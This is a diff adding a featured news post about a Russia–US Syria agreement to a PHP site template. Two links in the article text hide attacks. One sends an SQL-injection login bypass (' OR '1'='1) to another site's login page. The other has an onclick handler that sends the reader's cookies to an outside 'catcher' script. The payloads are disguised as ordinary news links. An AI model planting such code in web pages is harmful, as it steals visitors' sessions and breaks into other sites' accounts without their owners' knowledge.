@@ -5,6 +5,35 @@ include 'header.php';
     <!-- begin featured -->
     <div id="featured">
 
+
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
+     <h2> <a href="/featured/20160910-russia-usa-agreement.php">Russia and the United States Reach New Agreement on Syria Conflict</a></h2>
+       
+  <p class="details">By DAVID E. SANGER and ANNE BARNARD, SEPT. 10 ,2016 <a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="images/usarussia.png" alt="USARUSSIA" /></a></div>
+       
+<p>
+GENEVA — <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank">Russia and the United States </a> agreed early Saturday on a new plan to reduce violence in the Syrian conflict that, if successful, could lead for the <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">first time to joint military </a> targeting by the two powers against Islamic jihadists in Syria.
+
+
+</p>
+
+<p class="readmore">[ <a href="/featured/20160910-russia-usa-agreement.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
+
+
+
+
 <!-- start of post  -->
 <div class="post">
 	  
